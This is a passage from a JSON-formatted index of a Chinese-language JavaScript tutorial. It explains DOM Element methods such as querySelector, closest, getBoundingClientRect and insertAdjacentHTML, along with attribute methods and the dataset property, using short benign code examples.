id=&quot;div-02&quot;&gt;Here is div-02&lt;/div&gt;</code></pre><p><code>Element.previousElementSibling</code>属性返回当前元素节点的前一个同级元素节点，如果没有则返回<code>null</code>。</p>\n\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#属性相关方法' class='header-anchor'>#</a>\n            <span>属性相关方法</span>\n        </h3>\n    <p>元素节点提供六个方法，用来操作属性。</p>\n<ul>\n<li><code>getAttribute()</code>：读取某个属性的值</li>\n<li><code>getAttributeNames()</code>：返回当前元素的所有属性名</li>\n<li><code>setAttribute()</code>：写入属性值</li>\n<li><code>hasAttribute()</code>：某个属性是否存在</li>\n<li><code>hasAttributes()</code>：当前元素是否有属性</li>\n<li><code>removeAttribute()</code>：删除属性</li>\n</ul>\n<p>这些方法的介绍请看《属性的操作》一章。</p>\n\n        <h3>\n            <a href='#Element.querySelector()' class='header-anchor'>#</a>\n            <span>Element.querySelector()</span>\n        </h3>\n    <p><code>Element.querySelector</code>方法接受 CSS 选择器作为参数，返回父元素的第一个匹配的子元素。如果没有找到匹配的子元素，就返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var content = document.getElementById(&#039;content&#039;);\nvar el = content.querySelector(&#039;p&#039;);</code></pre><p>上面代码返回<code>content</code>节点的第一个<code>p</code>元素。</p>\n<p><code>Element.querySelector</code>方法可以接受任何复杂的 CSS 选择器。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.body.querySelector(&quot;style[type=&#039;text/css&#039;], style:not([type])&quot;);</code></pre><p>注意，这个方法无法选中伪元素。</p>\n<p>它可以接受多个选择器，它们之间使用逗号分隔。</p>\n<pre class=\"prettyprint language-javascript\"><code>element.querySelector(&#039;div, p&#039;)</code></pre><p>上面代码返回<code>element</code>的第一个<code>div</code>或<code>p</code>子元素。</p>\n<p>需要注意的是，浏览器执行<code>querySelector</code>方法时，是先在全局范围内搜索给定的 CSS 选择器，然后过滤出哪些属于当前元素的子元素。因此，会有一些违反直觉的结果，下面是一段 HTML 代码。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div&gt;\n&lt;blockquote id=&quot;outer&quot;&gt;\n  &lt;p&gt;Hello&lt;/p&gt;\n  &lt;div id=&quot;inner&quot;&gt;\n    &lt;p&gt;World&lt;/p&gt;\n  &lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;/div&gt;</code></pre><p>那么，像下面这样查询的话，实际上返回的是第一个<code>p</code>元素，而不是第二个。</p>\n<pre class=\"prettyprint language-javascript\"><code>var outer = document.getElementById(&#039;outer&#039;);\nouter.querySelector(&#039;div p&#039;)\n// &lt;p&gt;Hello&lt;/p&gt;</code></pre>\n        <h3>\n            <a href='#Element.querySelectorAll()' class='header-anchor'>#</a>\n            <span>Element.querySelectorAll()</span>\n        </h3>\n    <p><code>Element.querySelectorAll</code>方法接受 CSS 选择器作为参数，返回一个<code>NodeList</code>实例，包含所有匹配的子元素。</p>\n<pre class=\"prettyprint language-javascript\"><code>var el = document.querySelector(&#039;#test&#039;);\nvar matches = el.querySelectorAll(&#039;div.highlighted &gt; p&#039;);</code></pre><p>该方法的执行机制与<code>querySelector</code>方法相同，也是先在全局范围内查找，再过滤出当前元素的子元素。因此，选择器实际上针对整个文档的。</p>\n<p>它也可以接受多个 CSS 选择器，它们之间使用逗号分隔。如果选择器里面有伪元素的选择器，则总是返回一个空的<code>NodeList</code>实例。</p>\n\n        <h3>\n            <a href='#Element.getElementsByClassName()' class='header-anchor'>#</a>\n            <span>Element.getElementsByClassName()</span>\n        </h3>\n    <p><code>Element.getElementsByClassName</code>方法返回一个<code>HTMLCollection</code>实例，成员是当前元素节点的所有具有指定 class 的子元素节点。该方法与<code>document.getElementsByClassName</code>方法的用法类似，只是搜索范围不是整个文档，而是当前元素节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>element.getElementsByClassName(&#039;red test&#039;);</code></pre><p>注意，该方法的参数大小写敏感。</p>\n<p>由于<code>HTMLCollection</code>实例是一个活的集合，<code>document</code>对象的任何变化会立刻反应到实例，下面的代码不会生效。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div id=&quot;example&quot;&gt;\n//   &lt;p class=&quot;foo&quot;&gt;&lt;/p&gt;\n//   &lt;p class=&quot;foo&quot;&gt;&lt;/p&gt;\n// &lt;/div&gt;\nvar element = document.getElementById(&#039;example&#039;);\nvar matches = element.getElementsByClassName(&#039;foo&#039;);\n\nfor (var i = 0; i&lt; matches.length; i++) {\n  matches[i].classList.remove(&#039;foo&#039;);\n  matches.item(i).classList.add(&#039;bar&#039;);\n}\n// 执行后，HTML 代码如下\n// &lt;div id=&quot;example&quot;&gt;\n//   &lt;p&gt;&lt;/p&gt;\n//   &lt;p class=&quot;foo bar&quot;&gt;&lt;/p&gt;\n// &lt;/div&gt;</code></pre><p>上面代码中，<code>matches</code>集合的第一个成员，一旦被拿掉 class 里面的<code>foo</code>，就会立刻从<code>matches</code>里面消失，导致出现上面的结果。</p>\n\n        <h3>\n            <a href='#Element.getElementsByTagName()' class='header-anchor'>#</a>\n            <span>Element.getElementsByTagName()</span>\n        </h3>\n    <p><code>Element.getElementsByTagName</code>方法返回一个<code>HTMLCollection</code>实例，成员是当前节点的所有匹配指定标签名的子元素节点。该方法与<code>document.getElementsByClassName</code>方法的用法类似，只是搜索范围不是整个文档，而是当前元素节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var table = document.getElementById(&#039;forecast-table&#039;);\nvar cells = table.getElementsByTagName(&#039;td&#039;);</code></pre><p>注意，该方法的参数是大小写不敏感的。</p>\n\n        <h3>\n            <a href='#Element.closest()' class='header-anchor'>#</a>\n            <span>Element.closest()</span>\n        </h3>\n    <p><code>Element.closest</code>方法接受一个 CSS 选择器作为参数，返回匹配该选择器的、最接近当前节点的一个祖先节点（包括当前节点本身）。如果没有任何节点匹配 CSS 选择器，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;article&gt;\n//   &lt;div id=&quot;div-01&quot;&gt;Here is div-01\n//     &lt;div id=&quot;div-02&quot;&gt;Here is div-02\n//       &lt;div id=&quot;div-03&quot;&gt;Here is div-03&lt;/div&gt;\n//     &lt;/div&gt;\n//   &lt;/div&gt;\n// &lt;/article&gt;\n\nvar div03 = document.getElementById(&#039;div-03&#039;);\n\n// div-03 最近的祖先节点\ndiv03.closest(&quot;#div-02&quot;) // div-02\ndiv03.closest(&quot;div div&quot;) // div-03\ndiv03.closest(&quot;article &gt; div&quot;) //div-01\ndiv03.closest(&quot;:not(div)&quot;) // article</code></pre><p>上面代码中，由于<code>closest</code>方法将当前节点也考虑在内，所以第二个<code>closest</code>方法返回<code>div-03</code>。</p>\n\n        <h3>\n            <a href='#Element.matches()' class='header-anchor'>#</a>\n            <span>Element.matches()</span>\n        </h3>\n    <p><code>Element.matches</code>方法返回一个布尔值，表示当前元素是否匹配给定的 CSS 选择器。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (el.matches(&#039;.someClass&#039;)) {\n  console.log(&#039;Match!&#039;);\n}</code></pre>\n        <h3>\n            <a href='#事件相关方法' class='header-anchor'>#</a>\n            <span>事件相关方法</span>\n        </h3>\n    <p>以下三个方法与<code>Element</code>节点的事件相关。这些方法都继承自<code>EventTarget</code>接口，详见相关章节。</p>\n<ul>\n<li><code>Element.addEventListener()</code>：添加事件的回调函数</li>\n<li><code>Element.removeEventListener()</code>：移除事件监听函数</li>\n<li><code>Element.dispatchEvent()</code>：触发事件</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>element.addEventListener(&#039;click&#039;, listener, false);\nelement.removeEventListener(&#039;click&#039;, listener, false);\n\nvar event = new Event(&#039;click&#039;);\nelement.dispatchEvent(event);</code></pre>\n        <h3>\n            <a href='#Element.scrollIntoView()' class='header-anchor'>#</a>\n            <span>Element.scrollIntoView()</span>\n        </h3>\n    <p><code>Element.scrollIntoView</code>方法滚动当前元素，进入浏览器的可见区域，类似于设置<code>window.location.hash</code>的效果。</p>\n<pre class=\"prettyprint language-javascript\"><code>el.scrollIntoView(); // 等同于el.scrollIntoView(true)\nel.scrollIntoView(false);</code></pre><p>该方法可以接受一个布尔值作为参数。如果为<code>true</code>，表示元素的顶部与当前区域的可见部分的顶部对齐（前提是当前区域可滚动）；如果为<code>false</code>，表示元素的底部与当前区域的可见部分的尾部对齐（前提是当前区域可滚动）。如果没有提供该参数，默认为<code>true</code>。</p>\n\n        <h3>\n            <a href='#Element.getBoundingClientRect()' class='header-anchor'>#</a>\n            <span>Element.getBoundingClientRect()</span>\n        </h3>\n    <p><code>Element.getBoundingClientRect</code>方法返回一个对象，提供当前元素节点的大小、位置等信息，基本上就是 CSS 盒状模型的所有信息。</p>\n<pre class=\"prettyprint language-javascript\"><code>var rect = obj.getBoundingClientRect();</code></pre><p>上面代码中，<code>getBoundingClientRect</code>方法返回的<code>rect</code>对象，具有以下属性（全部为只读）。</p>\n<ul>\n<li><code>x</code>：元素左上角相对于视口的横坐标</li>\n<li><code>y</code>：元素左上角相对于视口的纵坐标</li>\n<li><code>height</code>：元素高度</li>\n<li><code>width</code>：元素宽度</li>\n<li><code>left</code>：元素左上角相对于视口的横坐标，与<code>x</code>属性相等</li>\n<li><code>right</code>：元素右边界相对于视口的横坐标（等于<code>x + width</code>）</li>\n<li><code>top</code>：元素顶部相对于视口的纵坐标，与<code>y</code>属性相等</li>\n<li><code>bottom</code>：元素底部相对于视口的纵坐标（等于<code>y + height</code>）</li>\n</ul>\n<p>由于元素相对于视口（viewport）的位置，会随着页面滚动变化，因此表示位置的四个属性值，都不是固定不变的。如果想得到绝对位置，可以将<code>left</code>属性加上<code>window.scrollX</code>，<code>top</code>属性加上<code>window.scrollY</code>。</p>\n<p>注意，<code>getBoundingClientRect</code>方法的所有属性，都把边框（<code>border</code>属性）算作元素的一部分。也就是说，都是从边框外缘的各个点来计算。因此，<code>width</code>和<code>height</code>包括了元素本身 + <code>padding</code> + <code>border</code>。</p>\n<p>另外，上面的这些属性，都是继承自原型的属性，<code>Object.keys</code>会返回一个空数组，这一点也需要注意。</p>\n<pre class=\"prettyprint language-javascript\"><code>var rect = document.body.getBoundingClientRect();\nObject.keys(rect) // []</code></pre><p>上面代码中，<code>rect</code>对象没有自身属性，而<code>Object.keys</code>方法只返回对象自身的属性，所以返回了一个空数组。</p>\n\n        <h3>\n            <a href='#Element.getClientRects()' class='header-anchor'>#</a>\n            <span>Element.getClientRects()</span>\n        </h3>\n    <p><code>Element.getClientRects</code>方法返回一个类似数组的对象，里面是当前元素在页面上形成的所有矩形（所以方法名中的<code>Rect</code>用的是复数）。每个矩形都有<code>bottom</code>、<code>height</code>、<code>left</code>、<code>right</code>、<code>top</code>和<code>width</code>六个属性，表示它们相对于视口的四个坐标，以及本身的高度和宽度。</p>\n<p>对于盒状元素（比如<code>&lt;div&gt;</code>和<code>&lt;p&gt;</code>），该方法返回的对象中只有该元素一个成员。对于行内元素（比如<code>&lt;span&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;em&gt;</code>），该方法返回的对象有多少个成员，取决于该元素在页面上占据多少行。这是它和<code>Element.getBoundingClientRect()</code>方法的主要区别，后者对于行内元素总是返回一个矩形。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;span id=&quot;inline&quot;&gt;Hello World Hello World Hello World&lt;/span&gt;</code></pre><p>上面代码是一个行内元素<code>&lt;span&gt;</code>，如果它在页面上占据三行，<code>getClientRects</code>方法返回的对象就有三个成员，如果它在页面上占据一行，<code>getClientRects</code>方法返回的对象就只有一个成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>var el = document.getElementById(&#039;inline&#039;);\nel.getClientRects().length // 3\nel.getClientRects()[0].left // 8\nel.getClientRects()[0].right // 113.908203125\nel.getClientRects()[0].bottom // 31.200000762939453\nel.getClientRects()[0].height // 23.200000762939453\nel.getClientRects()[0].width // 105.908203125</code></pre><p>这个方法主要用于判断行内元素是否换行，以及行内元素的每一行的位置偏移。</p>\n<p>注意，如果行内元素包括换行符，那么该方法会把换行符考虑在内。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;span id=&quot;inline&quot;&gt;\n  Hello World\n  Hello World\n  Hello World\n&lt;/span&gt;</code></pre><p>上面代码中，<code>&lt;span&gt;</code>节点内部有三个换行符，即使 HTML 语言忽略换行符，将它们显示为一行，<code>getClientRects()</code>方法依然会返回三个成员。如果行宽设置得特别窄，上面的<code>&lt;span&gt;</code>元素显示为6行，那么就会返回六个成员。</p>\n\n        <h3>\n            <a href='#Element.insertAdjacentElement()' class='header-anchor'>#</a>\n            <span>Element.insertAdjacentElement()</span>\n        </h3>\n    <p><code>Element.insertAdjacentElement</code>方法在相对于当前元素的指定位置，插入一个新的节点。该方法返回被插入的节点，如果插入失败，返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>element.insertAdjacentElement(position, element);</code></pre><p><code>Element.insertAdjacentElement</code>方法一共可以接受两个参数，第一个参数是一个字符串，表示插入的位置，第二个参数是将要插入的节点。第一个参数只可以取如下的值。</p>\n<ul>\n<li><code>beforebegin</code>：当前元素之前</li>\n<li><code>afterbegin</code>：当前元素内部的第一个子节点前面</li>\n<li><code>beforeend</code>：当前元素内部的最后一个子节点后面</li>\n<li><code>afterend</code>：当前元素之后</li>\n</ul>\n<p>注意，<code>beforebegin</code>和<code>afterend</code>这两个值，只在当前节点有父节点时才会生效。如果当前节点是由脚本创建的，没有父节点，那么插入会失败。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p1 = document.createElement(&#039;p&#039;)\nvar p2 = document.createElement(&#039;p&#039;)\np1.insertAdjacentElement(&#039;afterend&#039;, p2) // null</code></pre><p>上面代码中，<code>p1</code>没有父节点，所以插入<code>p2</code>到它后面就失败了。</p>\n<p>如果插入的节点是一个文档里现有的节点，它会从原有位置删除，放置到新的位置。</p>\n\n        <h3>\n            <a href='#Element.insertAdjacentHTML()，Element.insertAdjacentText()' class='header-anchor'>#</a>\n            <span>Element.insertAdjacentHTML()，Element.insertAdjacentText()</span>\n        </h3>\n    <p><code>Element.insertAdjacentHTML</code>方法用于将一个 HTML 字符串，解析生成 DOM 结构，插入相对于当前节点的指定位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>element.insertAdjacentHTML(position, text);</code></pre><p>该方法接受两个参数，第一个是一个表示指定位置的字符串，第二个是待解析的 HTML 字符串。第一个参数只能设置下面四个值之一。</p>\n<ul>\n<li><code>beforebegin</code>：当前元素之前</li>\n<li><code>afterbegin</code>：当前元素内部的第一个子节点前面</li>\n<li><code>beforeend</code>：当前元素内部的最后一个子节点后面</li>\n<li><code>afterend</code>：当前元素之后</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码：&lt;div id=&quot;one&quot;&gt;one&lt;/div&gt;\nvar d1 = document.getElementById(&#039;one&#039;);\nd1.insertAdjacentHTML(&#039;afterend&#039;, &#039;&lt;div id=&quot;two&quot;&gt;two&lt;/div&gt;&#039;);\n// 执行后的 HTML 代码：\n// &lt;div id=&quot;one&quot;&gt;one&lt;/div&gt;&lt;div id=&quot;two&quot;&gt;two&lt;/div&gt;</code></pre><p>该方法只是在现有的 DOM 结构里面插入节点，这使得它的执行速度比<code>innerHTML</code>方法快得多。</p>\n<p>注意，该方法不会转义 HTML 字符串，这导致它不能用来插入用户输入的内容，否则会有安全风险。</p>\n<p><code>Element.insertAdjacentText</code>方法在相对于当前节点的指定位置，插入一个文本节点，用法与<code>Element.insertAdjacentHTML</code>方法完全一致。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码：&lt;div id=&quot;one&quot;&gt;one&lt;/div&gt;\nvar d1 = document.getElementById(&#039;one&#039;);\nd1.insertAdjacentText(&#039;afterend&#039;, &#039;two&#039;);\n// 执行后的 HTML 代码：\n// &lt;div id=&quot;one&quot;&gt;one&lt;/div&gt;two</code></pre>\n        <h3>\n            <a href='#Element.remove()' class='header-anchor'>#</a>\n            <span>Element.remove()</span>\n        </h3>\n    <p><code>Element.remove</code>方法继承自 ChildNode 接口，用于将当前元素节点从它的父节点移除。</p>\n<pre class=\"prettyprint language-javascript\"><code>var el = document.getElementById(&#039;mydiv&#039;);\nel.remove();</code></pre><p>上面代码将<code>el</code>节点从 DOM 树里面移除。</p>\n\n        <h3>\n            <a href='#Element.focus()，Element.blur()' class='header-anchor'>#</a>\n            <span>Element.focus()，Element.blur()</span>\n        </h3>\n    <p><code>Element.focus</code>方法用于将当前页面的焦点，转移到指定元素上。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.getElementById(&#039;my-span&#039;).focus();</code></pre><p>该方法可以接受一个对象作为参数。参数对象的<code>preventScroll</code>属性是一个布尔值，指定是否将当前元素停留在原始位置，而不是滚动到可见区域。</p>\n<pre class=\"prettyprint language-javascript\"><code>function getFocus() {\n  document.getElementById(&#039;btn&#039;).focus({preventScroll:false});\n}</code></pre><p>上面代码会让<code>btn</code>元素获得焦点，并滚动到可见区域。</p>\n<p>最后，从<code>document.activeElement</code>属性可以得到当前获得焦点的元素。</p>\n<p><code>Element.blur</code>方法用于将焦点从当前元素移除。</p>\n\n        <h3>\n            <a href='#Element.click()' class='header-anchor'>#</a>\n            <span>Element.click()</span>\n        </h3>\n    <p><code>Element.click</code>方法用于在当前元素上模拟一次鼠标点击，相当于触发了<code>click</code>事件。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Craig Buckler，<a href=\"https://www.sitepoint.com/how-to-translate-from-dom-to-svg-coordinates-and-back-again/\">How to Translate from DOM to SVG Coordinates and Back Again</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"DOM","link":"javascript:void(0)"},{"title":"属性的操作","link":"/dom/attributes.html"}],"content":"\n        <h1>\n            <a href='#属性的操作' class='header-anchor'>#</a>\n            <span>属性的操作</span>\n        </h1>\n    <p>HTML 元素包括标签名和若干个键值对，这个键值对就称为“属性”（attribute）。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;a id=&quot;test&quot; href=&quot;http://www.example.com&quot;&gt;\n  链接\n&lt;/a&gt;</code></pre><p>上面代码中，<code>a</code>元素包括两个属性：<code>id</code>属性和<code>href</code>属性。</p>\n<p>属性本身是一个对象（<code>Attr</code>对象），但是实际上，这个对象极少使用。一般都是通过元素节点对象（<code>HTMlElement</code>对象）来操作属性。本章介绍如何操作这些属性。</p>\n\n        <h2>\n            <a href='#Element.attributes-属性' class='header-anchor'>#</a>\n            <span>Element.attributes 属性</span>\n        </h2>\n    <p>元素对象有一个<code>attributes</code>属性，返回一个类似数组的动态对象，成员是该元素标签的所有属性节点对象，属性的实时变化都会反映在这个节点对象上。其他类型的节点对象，虽然也有<code>attributes</code>属性，但返回的都是<code>null</code>，因此可以把这个属性视为元素对象独有的。</p>\n<p>单个属性可以通过序号引用，也可以通过属性名引用。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;body bgcolor=&quot;yellow&quot; onload=&quot;&quot;&gt;\ndocument.body.attributes[0]\ndocument.body.attributes.bgcolor\ndocument.body.attributes[&#039;ONLOAD&#039;]</code></pre><p>注意，上面代码的三种方法，返回的都是属性节点对象，而不是属性值。</p>\n<p>属性节点对象有<code>name</code>和<code>value</code>属性，对应该属性的属性名和属性值，等同于<code>nodeName</code>属性和<code>nodeValue</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML代码为\n// &lt;div id=&quot;mydiv&quot;&gt;\nvar n = document.getElementById(&#039;mydiv&#039;);\n\nn.attributes[0].name // &quot;id&quot;\nn.attributes[0].nodeName // &quot;id&quot;\n\nn.attributes[0].value // &quot;mydiv&quot;\nn.attributes[0].nodeValue // &quot;mydiv&quot;</code></pre><p>下面代码可以遍历一个元素节点的所有属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var para = document.getElementsByTagName(&#039;p&#039;)[0];\nvar result = document.getElementById(&#039;result&#039;);\n\nif (para.hasAttributes()) {\n  var attrs = para.attributes;\n  var output = &#039;&#039;;\n  for(var i = attrs.length - 1; i &gt;= 0; i--) {\n    output += attrs[i].name + &#039;-&gt;&#039; + attrs[i].value;\n  }\n  result.textContent = output;\n} else {\n  result.textContent = &#039;No attributes to show&#039;;\n}</code></pre>\n        <h2>\n            <a href='#元素的标准属性' class='header-anchor'>#</a>\n            <span>元素的标准属性</span>\n        </h2>\n    <p>HTML 元素的标准属性（即在标准中定义的属性），会自动成为元素节点对象的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = document.getElementById(&#039;test&#039;);\na.id // &quot;test&quot;\na.href // &quot;http://www.example.com/&quot;</code></pre><p>上面代码中，<code>a</code>元素标签的属性<code>id</code>和<code>href</code>，自动成为节点对象的属性。</p>\n<p>这些属性都是可写的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var img = document.getElementById(&#039;myImage&#039;);\nimg.src = &#039;http://www.example.com/image.jpg&#039;;</code></pre><p>上面的写法，会立刻替换掉<code>img</code>对象的<code>src</code>属性，即会显示另外一张图片。</p>\n<p>这种修改属性的方法，常常用于添加表单的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = document.forms[0];\nf.action = &#039;submit.php&#039;;\nf.method = &#039;POST&#039;;</code></pre><p>上面代码为表单添加提交网址和提交方法。</p>\n<p>注意，这种用法虽然可以读写属性，但是无法删除属性，<code>delete</code>运算符在这里不会生效。</p>\n<p>HTML 元素的属性名是大小写不敏感的，但是 JavaScript 对象的属性名是大小写敏感的。转换规则是，转为 JavaScript 属性名时，一律采用小写。如果属性名包括多个单词，则采用骆驼拼写法，即从第二个单词开始，每个单词的首字母采用大写，比如<code>onClick</code>。</p>\n<p>有些 HTML 属性名是 JavaScript 的保留字，转为 JavaScript 属性时，必须改名。主要是以下两个。</p>\n<ul>\n<li><code>for</code>属性改为<code>htmlFor</code></li>\n<li><code>class</code>属性改为<code>className</code></li>\n</ul>\n<p>另外，HTML 属性值一般都是字符串，但是 JavaScript 属性会自动转换类型。比如，将字符串<code>true</code>转为布尔值，将<code>onClick</code>的值转为一个函数，将<code>style</code>属性的值转为一个<code>CSSStyleDeclaration</code>对象。因此，可以对这些属性赋予各种类型的值。</p>\n\n        <h2>\n            <a href='#属性操作的标准方法' class='header-anchor'>#</a>\n            <span>属性操作的标准方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p>元素节点提供六个方法，用来操作属性。</p>\n<ul>\n<li><code>getAttribute()</code></li>\n<li><code>getAttributeNames()</code></li>\n<li><code>setAttribute()</code></li>\n<li><code>hasAttribute()</code></li>\n<li><code>hasAttributes()</code></li>\n<li><code>removeAttribute()</code></li>\n</ul>\n<p>这有几点注意。</p>\n<p>（1）适用性</p>\n<p>这六个方法对所有属性（包括用户自定义的属性）都适用。</p>\n<p>（2）返回值</p>\n<p><code>getAttribute()</code>只返回字符串，不会返回其他类型的值。</p>\n<p>（3）属性名</p>\n<p>这些方法只接受属性的标准名称，不用改写保留字，比如<code>for</code>和<code>class</code>都可以直接使用。另外，这些方法对于属性名是大小写不敏感的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var image = document.images[0];\nimage.setAttribute(&#039;class&#039;, &#039;myImage&#039;);</code></pre><p>上面代码中，<code>setAttribute</code>方法直接使用<code>class</code>作为属性名，不用写成<code>className</code>。</p>\n\n        <h3>\n            <a href='#Element.getAttribute()' class='header-anchor'>#</a>\n            <span>Element.getAttribute()</span>\n        </h3>\n    <p><code>Element.getAttribute</code>方法返回当前元素节点的指定属性。如果指定属性不存在，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为\n// &lt;div id=&quot;div1&quot; align=&quot;left&quot;&gt;\nvar div = document.getElementById(&#039;div1&#039;);\ndiv.getAttribute(&#039;align&#039;) // &quot;left&quot;</code></pre>\n        <h3>\n            <a href='#Element.getAttributeNames()' class='header-anchor'>#</a>\n            <span>Element.getAttributeNames()</span>\n        </h3>\n    <p><code>Element.getAttributeNames()</code>返回一个数组，成员是当前元素的所有属性的名字。如果当前元素没有任何属性，则返回一个空数组。使用<code>Element.attributes</code>属性，也可以拿到同样的结果，唯一的区别是它返回的是类似数组的对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var mydiv = document.getElementById(&#039;mydiv&#039;);\n\nmydiv.getAttributeNames().forEach(function (key) {\n  var value = mydiv.getAttribute(key);\n  console.log(key, value);\n})</code></pre><p>上面代码用于遍历某个节点的所有属性。</p>\n\n        <h3>\n            <a href='#Element.setAttribute()' class='header-anchor'>#</a>\n            <span>Element.setAttribute()</span>\n        </h3>\n    <p><code>Element.setAttribute</code>方法用于为当前元素节点新增属性。如果同名属性已存在，则相当于编辑已存在的属性。该方法没有返回值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为\n// &lt;button&gt;Hello World&lt;/button&gt;\nvar b = document.querySelector(&#039;button&#039;);\nb.setAttribute(&#039;name&#039;, &#039;myButton&#039;);\nb.setAttribute(&#039;disabled&#039;, true);</code></pre><p>上面代码中，<code>button</code>元素的<code>name</code>属性被设成<code>myButton</code>，<code>disabled</code>属性被设成<code>true</code>。</p>\n<p>这里有两个地方需要注意，首先，属性值总是字符串，其他类型的值会自动转成字符串，比如布尔值<code>true</code>就会变成字符串<code>true</code>；其次，上例的<code>disable</code>属性是一个布尔属性，对于<code>&lt;button&gt;</code>元素来说，这个属性不需要属性值，只要设置了就总是会生效，因此<code>setAttribute</code>方法里面可以将<code>disabled</code>属性设成任意值。</p>\n\n        <h3>\n            <a href='#Element.hasAttribute()' class='header-anchor'>#</a>\n            <span>Element.hasAttribute()</span>\n        </h3>\n    <p><code>Element.hasAttribute</code>方法返回一个布尔值，表示当前元素节点是否包含指定属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = document.getElementById(&#039;div1&#039;);\n\nif (d.hasAttribute(&#039;align&#039;)) {\n  d.setAttribute(&#039;align&#039;, &#039;center&#039;);\n}</code></pre><p>上面代码检查<code>div</code>节点是否含有<code>align</code>属性。如果有，则设置为居中对齐。</p>\n\n        <h3>\n            <a href='#Element.hasAttributes()' class='header-anchor'>#</a>\n            <span>Element.hasAttributes()</span>\n        </h3>\n    <p><code>Element.hasAttributes</code>方法返回一个布尔值，表示当前元素是否有属性，如果没有任何属性，就返回<code>false</code>，否则返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var foo = document.getElementById(&#039;foo&#039;);\nfoo.hasAttributes() // true</code></pre>\n        <h3>\n            <a href='#Element.removeAttribute()' class='header-anchor'>#</a>\n            <span>Element.removeAttribute()</span>\n        </h3>\n    <p><code>Element.removeAttribute</code>方法移除指定属性。该方法没有返回值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为\n// &lt;div id=&quot;div1&quot; align=&quot;left&quot; width=&quot;200px&quot;&gt;\ndocument.getElementById(&#039;div1&#039;).removeAttribute(&#039;align&#039;);\n// 现在的HTML代码为\n// &lt;div id=&quot;div1&quot; width=&quot;200px&quot;&gt;</code></pre>\n        <h2>\n            <a href='#dataset-属性' class='header-anchor'>#</a>\n            <span>dataset 属性</span>\n        </h2>\n    <p>有时，需要在HTML元素上附加数据，供 JavaScript 脚本使用。一种解决方法是自定义属性。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div id=&quot;mydiv&quot; foo=&quot;bar&quot;&gt;</code></pre><p>上面代码为<code>div</code>元素自定义了<code>foo</code>属性，然后可以用<code>getAttribute()</code>和<code>setAttribute()</code>读写这个属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = document.getElementById(&#039;mydiv&#039;);\nn.getAttribute(&#039;foo&#039;) // bar\nn.setAttribute(&#039;foo&#039;, &#039;baz&#039;)</code></pre><p>这种方法虽然可以达到目的，但是会使得 HTML 元素的属性不符合标准，导致网页代码通不过校验。</p>\n<p>更好的解决方法是，使用标准提供的<code>data-*</code>属性。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div id=&quot;mydiv&quot; data-foo=&quot;bar&quot;&gt;</code></pre><p>然后，使用元素节点对象的<code>dataset</code>属性，它指向一个对象，可以用来操作 HTML 元素标签的<code>data-*</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = document.getElementById(&#039;mydiv&#039;);\nn.dataset.foo // bar\nn.dataset.foo = &#039;baz&#039;</code></pre><p>上面代码中，通过<code>dataset.foo</code>读写<code>data-foo</code>属性。</p>\n<p>删除一个<code>data-*</code>属性，可以直接使用<code>delete</code>命令。</p>\n<pre class=\"prettyprint language-javascript\"><code>delete 